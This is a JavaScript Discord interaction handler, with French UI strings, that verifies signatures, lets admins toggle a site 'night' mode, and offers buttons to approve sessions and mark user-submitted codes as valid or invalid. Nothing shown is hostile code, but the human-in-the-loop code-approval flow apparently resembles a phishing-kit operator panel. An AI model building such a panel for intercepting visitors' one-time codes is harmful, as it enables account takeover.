import {
  InteractionType,
  InteractionResponseType,
  verifyKey,
} from "discord-interactions";
import { approveSession, approveCode, rejectCode } from "./session-store.js";
import { getSiteMode, setSiteMode, isAdminUser } from "./site-mode.js";

function singleButtonRow(label, style = 3) {
  return [
    {
      type: 1,
      components: [
        {
          type: 2,
          style,
          label,
          custom_id: "done",
          disabled: true,
        },
      ],
    },
  ];
}

function codeResultButtons(valid) {
  return [
    {
      type: 1,
      components: [
        {
          type: 2,
          style: 3,
          label: valid ? "✓ Code bon" : "Code bon",
          custom_id: "done_ok",
          disabled: true,
        },
        {
          type: 2,
          style: 4,
          label: valid ? "Code invalide" : "✓ Code invalide",
          custom_id: "done_invalid",
          disabled: true,
        },
      ],
    },
  ];
}

async function updateInteractionMessage(interaction, components) {
  const applicationId = interaction.application_id;
  const token = interaction.token;

  if (!applicationId || !token) return;

  await fetch(
    `https://discord.com/api/v10/webhooks/${applicationId}/${token}/messages/@original`,
    {
      method: "PATCH",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ components }),
    },
  );
}

async function handleComponentAction(interaction, sessionId, action) {
  let success = false;
  let components = singleButtonRow("Session introuvable", 4);

  if (action === "approve") {
    success = await approveSession(sessionId);
    components = singleButtonRow(success ? "✓ Code envoyé" : "Déjà validé", 3);
  }

  if (action === "code_ok") {
    success = await approveCode(sessionId);
    components = codeResultButtons(true);
  }

  if (action === "code_invalid") {
    success = await rejectCode(sessionId);
    components = codeResultButtons(false);
  }

  return {
    status: 200,
    body: { type: InteractionResponseType.DEFERRED_UPDATE_MESSAGE },
    afterResponse: async () => {
      await updateInteractionMessage(interaction, components);
    },
  };
}

export async function handleDiscordInteraction(rawBody, signature, timestamp) {
  const publicKey = process.env.DISCORD_PUBLIC_KEY?.trim();

  if (!publicKey) {
    throw new Error("Discord public key not configured");
  }

  if (!signature || !timestamp || !rawBody) {
    return { status: 401, body: { error: "Missing signature headers" } };
  }

  const isValid = await verifyKey(rawBody, signature, timestamp, publicKey);

  if (!isValid) {
    console.error("Discord signature invalid — vérifie DISCORD_PUBLIC_KEY sur Vercel");
    return { status: 401, body: { error: "Invalid signature" } };
  }

  const interaction = JSON.parse(rawBody);

  if (interaction.type === InteractionType.PING) {
    return {
      status: 200,
      body: { type: InteractionResponseType.PONG },
    };
  }

  if (interaction.type === InteractionType.APPLICATION_COMMAND) {
    const userId = interaction.member?.user?.id ?? interaction.user?.id;

    if (!isAdminUser(userId)) {
      return {
        status: 200,
        body: {
          type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
          data: {
            content: "⛔ Vous n'avez pas la permission d'utiliser cette commande.",
            flags: 64,
          },
        },
      };
    }

    if (interaction.data.name === "mode") {
      const mode =
        interaction.data.options?.find((option) => option.name === "type")?.value ?? "normal";

      await setSiteMode(mode);
      const current = await getSiteMode();

      return {
        status: 200,
        body: {
          type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
          data: {
            content:
              current === "maintenance"
                ? "🌙 Mode **nuit** activé — les visiteurs verront le message d'indisponibilité après le chargement."
                : "✅ Mode **normal** activé — le site fonctionne comme d'habitude.",
            flags: 64,
          },
        },
      };
    }
  }

  if (interaction.type === InteractionType.MESSAGE_COMPONENT) {
    const customId = interaction.data?.custom_id ?? "";

    if (customId.startsWith("approve:")) {
      return handleComponentAction(interaction, customId.slice("approve:".length), "approve");
    }

    if (customId.startsWith("code_ok:")) {
      return handleComponentAction(interaction, customId.slice("code_ok:".length), "code_ok");
    }

    if (customId.startsWith("code_invalid:")) {
      return handleComponentAction(interaction, customId.slice("code_invalid:".length), "code_invalid");
    }
  }

  return {
    status: 400,
    body: { error: "Unknown interaction" },
  };
}
